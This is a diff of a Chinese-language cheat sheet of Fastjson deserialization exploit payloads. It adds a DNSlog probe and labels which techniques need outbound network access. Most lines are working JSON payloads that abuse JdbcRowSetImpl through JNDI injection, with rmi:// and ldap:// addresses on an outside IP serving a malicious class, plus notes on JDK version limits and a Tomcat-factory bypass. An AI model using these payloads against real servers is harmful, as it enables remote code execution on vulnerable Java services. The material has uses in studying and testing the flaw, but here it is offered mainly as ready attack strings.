@@ -10,17 +10,26 @@ https://github.com/YoungBear/FastjsonPoc
 https://github.com/LeadroyaL/fastjson-blacklist
 
 # poc
+## dnslog验证
+{"x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}}
 ## 1.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+鸡肋
 常规的Java字节码的执行，但是需要开启Feature.SupportNonPublicField，比较鸡肋
 ## 2.com.sun.rowset.JdbcRowSetImpl
+出网
 用到的是JNDI注入，利用条件相对较低，但是需要连接远程恶意服务器，在目标没外网的情况下无法直接利用
 ### 低版本jdk-rmi协议
+出网
 6u132, 7u122, 8u113之前
 String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
 ### 低版本jdk-ldap协议
+出网
 6u211, 7u201, 8u191, 11.0.1之前
 String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"ldap://47.95.7.37:1389/Calc", "autoCommit":true}";
+### c3p0
+不出网
 ### 高版本jdk
+不出网
 开启 TomcatBeanFactoryServer 绑定恶意类到registry, 无需外部获取Factory, 利用本地tomcat依赖中的Factory
 String poc = "{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;", "dataSourceName":"rmi://47.95.7.37:1099/Calc", "autoCommit":true}";
 受害者本地需要有下面依赖
